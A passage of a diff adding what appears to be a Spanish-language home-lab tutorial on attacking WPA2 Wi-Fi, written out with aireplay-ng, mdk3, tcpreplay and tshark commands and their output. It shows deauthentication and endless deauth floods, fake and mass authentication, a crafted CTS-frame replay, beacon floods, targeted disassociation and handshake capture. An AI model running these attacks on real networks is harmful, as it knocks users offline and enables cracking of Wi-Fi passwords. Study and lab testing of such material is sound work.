+  <li>Esta es otra forma.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aireplay-ng <span class="nt">-0</span> 15 <span class="nt">-e</span> MiguelWifi wlan0mon
+</code></pre></div></div>
+
+<ul>
+  <li>Si lo que queremos hacer es que ningún cliente se conecte podemos enviar paquetes infinitos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aireplay-ng <span class="nt">-0</span> 0 <span class="nt">-e</span> MiguelWifi wlan0mon
+</code></pre></div></div>
+
+<h2 id="ataque-de-autenticación">Ataque de Autenticación</h2>
+
+<ul>
+  <li>
+    <p>Este ataque nos va a permitir autenticar a un cliente a una red inalambrica o a un punto de acceso si vemos el panel de ayuda de <code class="language-plaintext highlighter-rouge">aireplay-ng</code> vemos que nos dicen sobre <strong>fakeauth</strong>.</p>
+  </li>
+  <li>
+    <p>Un ejemplo rápida para comprender este concepto es que mediante un <strong>AP</strong> que tenemos vamos a conectar un cliente suponiendo que no hay ningún cliente conectado al <strong>AP</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng <span class="nt">--bssid</span> C6:BF:FD:55:E2:F7 <span class="nt">--channel</span> 10 wlan0mon
+</code></pre></div></div>
+
+<ul>
+  <li>Si nos podemos a capturar vemos que de momento no hay ningún cliente asociado.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web11.png" />
+</p>
+
+<ul>
+  <li>Para autenticar a un cliente debemos proporcionar su dirección <strong>MAC</strong> yo por ejemplo voy a autenticar una laptop que tengo alado para practicar en este laboratorio y me se su dirección <strong>MAC</strong> , no le vamos a indicar paquetes si no que de manera ilimitada asta que se asocie termine.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aireplay-ng <span class="nt">-1</span> 0 <span class="nt">-e</span> MiguelWifi <span class="nt">-h</span> 00:26:6c:1f:03:d8 wlan0mon
+The interface MAC <span class="o">(</span>9C:EF:D5:F9:1E:C0<span class="o">)</span> doesn<span class="s1">'t match the specified MAC (-h).
+	ifconfig wlan0mon hw ether 00:26:6C:1F:03:D8
+18:37:14  Waiting for beacon frame (ESSID: MiguelWifi) on channel 10
+Found BSSID "C6:BF:FD:55:E2:F7" to given ESSID "MiguelWifi".
+
+18:37:14  Sending Authentication Request (Open System)
+
+18:37:16  Sending Authentication Request (Open System) [ACK]
+18:37:16  Authentication successful
+18:37:16  Sending Association Request [ACK]
+18:37:16  Association successful :-) (AID: 1)
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora vemos que como tal el cliente esta autenticado.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web12.png" />
+</p>
+
+<blockquote>
+  <p>Si expulsamos al cliente y tratamos de hacer una reconexión manual no va a generar ningun <strong>handshake</strong> por que todo esto es falso en la autenticación el cliente no dispone de la contraseña de la red es por eso que no va a viajar la contraseña por que es una falsa autenticación.</p>
+</blockquote>
+
+<h1 id="inyectar-clientes-de-manera-agresiva-autenticación-masiva">Inyectar clientes de manera agresiva (Autenticación masiva)</h1>
+
+<ul>
+  <li>Algo que podemos hacer es que con <code class="language-plaintext highlighter-rouge">mdk3</code> podemos hacer este tipo de ataque donde de forma agresiva va a inyectar demasiados clientes a una red inalambrica con esto lo que conseguimos es que al estar demasiados clientes se van a expulsar algunos por que va a estar saturada la red y cuando se reconecte podremos capturar el <strong>handshake</strong> es una forma como esta saturada la red se desconecta y se reasocia despues , solo le indicaremos la <strong>MAC</strong> de <strong>AP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mdk3 wlan0mon a <span class="nt">-a</span> C6:BF:FD:55:E2:F7
+</code></pre></div></div>
+
+<ul>
+  <li>Y se inyectan demasiados clientes tu puedes parar el ataque asta cuando quieras con un <code class="language-plaintext highlighter-rouge">CTRL+C</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web14.png" />
+</p>
+
+<h2 id="cts-frame-attack">CTS Frame attack</h2>
+
+<blockquote>
+  <p>Este ataque no suele salir ala primera y se necesita de algo de paciencia</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Este ataque lo que nos permite es dejar una red inalambrica inoperativa durante un largo periodo de tiempo esto nos permite dejar la red saturada para que los clientes sean expulsados y cuando se vuelvan a conectar automáticamente obtener el <strong>handshake</strong>.</p>
+  </li>
+  <li>
+    <p>Lo primero que vamos a hacer es abrir <code class="language-plaintext highlighter-rouge">wireshark</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wireshark &amp;&gt;/dev/null &amp; <span class="nb">disown</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a seleccionar esa interfaz.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web15.png" />
+</p>
+
+<ul>
+  <li>Una vez establecido eso vemos que como tal hay demasiados paquetes y como tal hay podemos ver nuestro <strong>AP</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web16.png" />
+</p>
+
+<blockquote>
+  <p>El paquete CTS o <strong>Clear-to-send</strong> esta formado por <strong>14 Bytes</strong> donde se incluye, <strong>Frame Control</strong>, la duración de la reserva, <strong>Dirección MAC de la estación que recibirá el paquete</strong>  y finalmente el <strong>Frame Check Sequence (FCS)</strong> es para comprobar la integridad de la trama.</p>
+</blockquote>
+
+<p><img src="/assets/wifi/hacking-wpa2/CTS.png" alt="" /></p>
+
+<p><img src="/assets/wifi/hacking-wpa2/FCS.png" alt="" /></p>
+
+<ul>
+  <li>Vamos a hacerlo para entenderlo mejor, vamos a filtrar por los paquetes <strong>CTS</strong>.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web17.png" alt="" /></p>
+
+<ul>
+  <li>Si queremos ver todo esto de mejor forma y ver mas información desde consola también podemos usar <code class="language-plaintext highlighter-rouge">tshark</code>, vamos a exportarlo a un <code class="language-plaintext highlighter-rouge">.cap</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-w</span> Captura.cap 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">airodump-ng</code> para poder capturar mas rápido y esperamos unos segundos antes de hacer <code class="language-plaintext highlighter-rouge">ctrl+c</code>.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web18.png" alt="" /></p>
+
+<ul>
+  <li>Otra forma es especificando directamente la interfaz.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web19.png" alt="" /></p>
+
+<ul>
+  <li>Si filtramos por lo mismo que en <code class="language-plaintext highlighter-rouge">wireshark</code> vemos que ya lo tenemos.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web20.png" alt="" /></p>
+
+<ul>
+  <li>Hay vemos el campo que nos interesa.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web21.png" alt="" /></p>
+
+<ul>
+  <li>Si queremos verlo desde <code class="language-plaintext highlighter-rouge">wireshark</code> estos serian.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web22.png" alt="" /></p>
+
+<ul>
+  <li>Vamos a seleccionar un paquete cualquiera en mi caso seria el <strong>19</strong> y vamos a darle en <strong>files</strong> y vamos a seleccionar la opción para guardar un paquete en especifico.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web23.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ file ataquects.pcap
+ataquects.pcap: pcap capture file, microsecond ts <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>802.11 with radiotap header, capture length 262144<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Por aquí vemos el campo que nos interesa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> ataquects.pcap <span class="nt">-Tfields</span> <span class="nt">-e</span> wlan.duration 2&gt;/dev/null
+270
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos abrir la captura.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web24.png" alt="" /></p>
+
+<ul>
+  <li>Estos valores corresponden ala <strong>MAC</strong> del punto de acceso.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web25.png" alt="" /></p>
+
+<ul>
+  <li>Y esto corresponde al tiempo en micro-segundos que esta en <strong>0</strong> <strong>xd</strong> esta en <strong>little endian</strong> puedes convertirlo a decimal con <strong>Python</strong>.</li>
+</ul>
+
+<p><img src="/assets/wifi/hacking-wpa2/web26.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Bueno lo mas probable es que si elegimos otro paquete que no se hizo al <strong>AP</strong> por eso el tiempo sea diferente pero bueno sigamos.</p>
+  </li>
+  <li>
+    <p>Nosotros como atacantes podemos establecer el tiempo máximo que son <strong>30K</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python
+Python 3.9.2 <span class="o">(</span>default, Feb 28 2021, 17:03:44<span class="o">)</span> 
+<span class="o">[</span>GCC 10.2.1 20210110] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> hex<span class="o">(</span>30000<span class="o">)</span>
+<span class="s1">'0x7530'</span>
+<span class="o">&gt;&gt;&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Pero hay que darle la vuelta entonces quedaría <strong>3075</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web27.png" />
+</p>
+
+<ul>
+  <li>Ahora vamos a establecer la dirección <strong>MAC</strong> del <strong>AP</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web28.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora lo guardamos y lo abrimos con <code class="language-plaintext highlighter-rouge">wireshark</code>.</p>
+  </li>
+  <li>
+    <p>Bueno como tal tuve unos pequeños inconvenientes y tuve que usar otro paquete pero para hacer el ataque simplemente hacemos lo siguiente.</p>
+  </li>
+  <li>
+    <p>Con <code class="language-plaintext highlighter-rouge">tcpreplay</code> indicándole la tarjeta de red en modo monitor a máxima velocidad le indicamos los <strong>loops</strong> para que haga 10K de iteraciones y le indicamos el paquete para que lo repita.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tcpreplay <span class="nt">--intf1</span><span class="o">=</span>wlan0mon <span class="nt">--topspeed</span> <span class="nt">--loop</span><span class="o">=</span>10000 ya.pcap 2&gt;/dev/null
+Actual: 10000 packets <span class="o">(</span>280000 bytes<span class="o">)</span> sent <span class="k">in </span>19.25 seconds
+Rated: 14539.0 Bps, 0.116 Mbps, 519.25 pps
+Statistics <span class="k">for </span>network device: wlan0mon
+	Successful packets:        10000
+	Failed packets:            0
+	Truncated packets:         0
+	Retried packets <span class="o">(</span>ENOBUFS<span class="o">)</span>: 0
+	Retried packets <span class="o">(</span>EAGAIN<span class="o">)</span>:  0
+</code></pre></div></div>
+
+<ul>
+  <li>Lo que deberíamos de ver en nuestros dispositivos es que la señal de tu wifi las rayitas tienen que disminuir ya que secuestraste de tal manera el ancho de banda, si lo que quieres es el <strong>handshake</strong> simplemente te pones con <code class="language-plaintext highlighter-rouge">airodump-ng</code> para capturarlo cuando el cliente se reasocie.</li>
+</ul>
+
+<h2 id="beacon-flood-mode-attack">Beacon Flood Mode Attack</h2>
+
+<ul>
+  <li>
+    <p>Para empezar el <strong>Beacon</strong> es un tipo de paquete que contiene informacion sobre el punto de acceso informacion sobre el canal en el que esta, el tipo de encriptado, el nombre y esas cosas.</p>
+  </li>
+  <li>
+    <p>Una forma de ver los paquetes es con <code class="language-plaintext highlighter-rouge">tshark</code> podemos filtrar directamente por esos paquetes mientras en otra terminal nos ponemos a monitorear con <code class="language-plaintext highlighter-rouge">airodump-ng</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web29.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Con la herramienta <code class="language-plaintext highlighter-rouge">mdk3</code> podemos generar este ataque esto lo que consigue es generar muchos paquetes de tipo <strong>Beacon</strong> vamos a generar demasiados <strong>AP</strong> en el mismo canal donde se sitúa el <strong>AP</strong> que tenemos para que la red se quede inoperativa para los clientes.</p>
+  </li>
+  <li>
+    <p>Vamos a generar los nombres de los <strong>AP</strong> que vamos a generar.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 10<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"WifiFree</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> names.txt<span class="p">;</span> <span class="k">done</span>
+❯ catn names.txt
+WifiFree1
+WifiFree2
+WifiFree3
+WifiFree4
+WifiFree5
+WifiFree6
+WifiFree7
+WifiFree8
+WifiFree9
+WifiFree10
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora con la herramienta <code class="language-plaintext highlighter-rouge">mdk3</code> vamos a hacer el siguiente ataque.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mdk3 <span class="nt">--help</span>
+
+MDK 3.0 v6 - <span class="s2">"Yeah, well, whatever"</span>
+by ASPj of k2wrlz, using the osdep library from aircrack-ng
+And with lots of <span class="nb">help </span>from the great aircrack-ng community:
+Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
+telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
+THANK YOU!
+
+MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
+IMPORTANT: It is your responsibility to make sure you have permission from the
+network owner before running MDK against it.
+
+This code is licenced under the GPLv2
+
+MDK USAGE:
+mdk3 &lt;interface&gt; &lt;test_mode&gt; <span class="o">[</span>test_options]
+
+Try mdk3 <span class="nt">--fullhelp</span> <span class="k">for </span>all <span class="nb">test </span>options
+Try mdk3 <span class="nt">--help</span> &lt;test_mode&gt; <span class="k">for </span>info about one <span class="nb">test </span>only
+
+TEST MODES:
+b   - Beacon Flood Mode
+      Sends beacon frames to show fake APs at clients.
+      This can sometimes crash network scanners and even drivers!
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora simplemente le pasamos el nombre del fichero donde estan los nombres de los <strong>AP</strong> y el canal donde se situa el <strong>AP</strong> que queremos atacar y comenzamos el ataque.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mdk3 wlan0mon b <span class="nt">-f</span> names.txt <span class="nt">-a</span> <span class="nt">-s</span> 1000 <span class="nt">-c</span> 2
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos ver como se crearon varios <strong>AP</strong> que fueron los que indicamos en el <strong>names.txt</strong> que están en el mismo canal estos se irán incrementando y va a saturar el <strong>AP</strong> victima ya que hay demasiados <strong>AP</strong> en el mismo canal.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/beacon.png" />
+</p>
+
+<ul>
+  <li>Otra forma seria de esta manera el problema es que el <strong>SSID</strong> van a ser aleatorios el nombre no lo vamos a especificar nosotros y con esto se dañaría el espectro de onda de la red para que quede inoperativa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mdk3 wlan0mon b <span class="nt">-c</span> 2
+</code></pre></div></div>
+
+<h2 id="disassociation-amok-mode-attack">Disassociation Amok Mode Attack</h2>
+
+<ul>
+  <li>
+    <p>Este ataque consiste básicamente en hacer un ataque de deautenticacion dirigido para poder hacer este ataque necesitamos crear un fichero con las direcciones <strong>MAC</strong> de los clientes a los cuales queremos deautenticar del <strong>AP</strong>.</p>
+  </li>
+  <li>
+    <p>Si monitoreamos el <strong>AP</strong> en mi caso hay 2 clientes conectados al <strong>AP</strong>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d1.png" />
+</p>
+
+<ul>
+  <li>En mi caso voy a indicar la direccion <strong>MAC</strong> <strong>84:4B:F5:48:6C:CF</strong> que es el cliente que quiero expulsar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nvim blacklist
+❯ catn blacklist
+84:4B:F5:48:6C:CF
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora para hacer el ataque simplemente usamos la herramienta <code class="language-plaintext highlighter-rouge">mdk3</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mdk3 wlan0mon d <span class="nt">-w</span> blacklist <span class="nt">-c</span> 1
+
+Periodically re-reading blacklist/whitelist every 3 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>Todos los <strong>AP</strong> que operen en el canal 1 va a estar expulsando a todos los clientes que tengan esa dirección <strong>MAC</strong> que indicamos en el archivo <strong>blacklist</strong>.</li>
+</ul>
+
+<h2 id="michael-shutdown-exploitation">Michael Shutdown Exploitation</h2>
+
+<ul>
+  <li>Este ataque lo que nos permite es apagar un <strong>router</strong> el problema de este ataque es que no es muy efectivo no hay mucha documentación sobre este ataque.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d2.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Como vemos no hay mucha información sobre este ataque a si que vamos a hacerlo de todas formas para este ataque necesitamos la herramienta <code class="language-plaintext highlighter-rouge">mdk3</code>.</p>
+  </li>
+  <li>
+    <p>Esto lo que hace es emitir los paquetes para que se apague el router pero no siempre funciona le vamos a indicar la dirección <strong>MAC</strong> del <strong>AP</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mdk3 wlan0mon m <span class="nt">-t</span> C6:BF:FD:55:E2:F7
+</code></pre></div></div>
+
+<h2 id="ataques-pasivos">Ataques Pasivos</h2>
+
+<ul>
+  <li>Bueno asta ahora hemos hecho ataques donde básicamente estamos deautenticando a los clientes del <strong>AP</strong> para que cuando se reconecten de forma automática al <strong>AP</strong> obtener el <strong>Handshake</strong> pero también hay una forma de básicamente obtener el <strong>handshake</strong> sin expulsar a nadie ya que cuando un dispositivo ya estuvo conectado al <strong>AP</strong> desde hace mucho cuando el dispositivo detecte la red wifi se va a conectar y si nosotros estamos en escucha en modo monitor vamos a capturar el <strong>handshake</strong> simplemente por que estamos escuchando  es una forma algo lenta por que tenemos que esperar a que se conecte o se reconecte pero bueno es igual funcional.</li>
+</ul>
+
+<h2 id="modos-de-filtro-con-tshark">Modos de filtro con tshark</h2>
+
+<ul>
+  <li>Bueno para esto recomiendo hacer un ataque de deautenticacion global para capturar el <strong>handshake</strong> y exportar.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d3.png" />
+</p>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d4.png" />
+</p>
+
+<p>Cuando un dispositivo se conecta ala red emite el <strong>Probe Request</strong> para filtrar por ese paquete se hace de esta manera</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-01.cap <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==4"</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>Si queremos capturar esos paquetes podemos hacer lo siguiente</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-i</span> wlan0mon <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==4"</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>Y en una terminal por debajo vamos a ejecutar lo siguiente <code class="language-plaintext highlighter-rouge">airodump-ng wlan0mon</code></p>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d5.png" />
+</p>
+
+<p>Cuando el dispositivo emite un <strong>Probe Request</strong> hay un <strong>Probe Response</strong></p>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d6.png" />
+</p>
+
+<ul>
+  <li>Después están los paquetes de asociación que son cuando el cliente se a tratado de asociar al <strong>AP</strong>  para filtrar por esos es de la siguiente forma.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d7.png" />
+</p>
+
+<ul>
+  <li>También tenemos el <strong>Association Response</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-01.cap <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==1"</span> 2&gt;/dev/null
+ 7819 133.720190 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 129 Association Response, <span class="nv">SN</span><span class="o">=</span>3088, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+</code></pre></div></div>
+
+<ul>
+  <li>Hay vemos un paquete <strong>Beacon</strong> que ya lo habíamos visto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-01.cap <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==8"</span> 2&gt;/dev/null
+    1   0.000000 c6:bf:fd:55:e2:f7 → Broadcast    802.11 281 Beacon frame, <span class="nv">SN</span><span class="o">=</span>1066, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........, <span class="nv">BI</span><span class="o">=</span>100, <span class="nv">SSID</span><span class="o">=</span><span class="s2">"MiguelWifi"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Estos son los paquetes de autenticacion.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-01.cap <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==11"</span> 2&gt;/dev/null
+ 6003 130.208233 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, <span class="nv">SN</span><span class="o">=</span>68, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+ 7806 133.704687 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, <span class="nv">SN</span><span class="o">=</span>4029, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+ 7809 133.708056 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3086, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+34291 184.497250 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, <span class="nv">SN</span><span class="o">=</span>3285, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+34297 184.501073 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+34298 184.502776 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34299 184.502921 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34300 184.504065 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34301 184.504392 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34302 184.504766 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34303 184.505328 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34304 184.505888 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34305 184.506479 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34306 184.507047 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34307 184.507682 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34308 184.508256 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34309 184.508876 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+34310 184.509440 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3135, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+37955 193.360020 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, <span class="nv">SN</span><span class="o">=</span>2395, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37957 193.369268 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, <span class="nv">SN</span><span class="o">=</span>3142, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+</code></pre></div></div>
+
+<ul>
+  <li>De esta forma filtramos por los paquetes de <strong>Deauthentication</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-01.cap <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==12"</span> 2&gt;/dev/null | <span class="nb">tail</span> <span class="nt">-n</span> 10
+37924 191.278041 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1012, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37925 191.280473    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1013, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37926 191.281691 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1012, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37927 191.282669    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1013, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37929 191.283940 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1014, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37930 191.285588 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1014, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
